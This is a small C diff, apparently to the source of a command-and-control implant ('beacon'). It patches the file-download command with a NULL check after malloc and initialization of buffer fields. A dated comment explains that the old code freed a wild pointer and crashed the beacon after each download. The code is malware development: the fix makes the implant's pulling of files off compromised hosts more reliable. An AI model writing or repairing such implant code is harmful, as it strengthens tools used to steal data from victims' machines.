@@ -116,7 +116,22 @@ void command_download(char * buffer, int length, void (*callback)(char * data, i
 	/* 创建新的下载条目（现在是个好时机） */
 /* 此条目在download_pull()中完全处理或停止后释放 */
 	entry = (file_entry *)malloc(sizeof(file_entry));
+	if (entry == NULL) {
+		post_error_s(0x28, fname);
+		data_free(chunk);
+		beacon_CloseHandle(infile);
+		return;
+	}
+	/* 2026-11-04: mem/mempos MUST be initialized on the FILE path too.
+	 * download_entry_drop()/download_entry_cleanup() free entry->mem when it
+	 * is non-NULL, and the old code left these fields holding heap garbage -
+	 * every completed download then freed a wild pointer and died with
+	 * STATUS_HEAP_CORRUPTION (0xC0000374) right after the file arrived
+	 * (live: file-browser download -> beacon crash, intermittent because a
+	 * fresh malloc is often zeroed). */
 	entry->handle = infile;
+	entry->mem    = NULL;
+	entry->mempos = 0;
 	entry->id     = download_id;
 	entry->toread = fsz;
 	entry->next   = download_list;
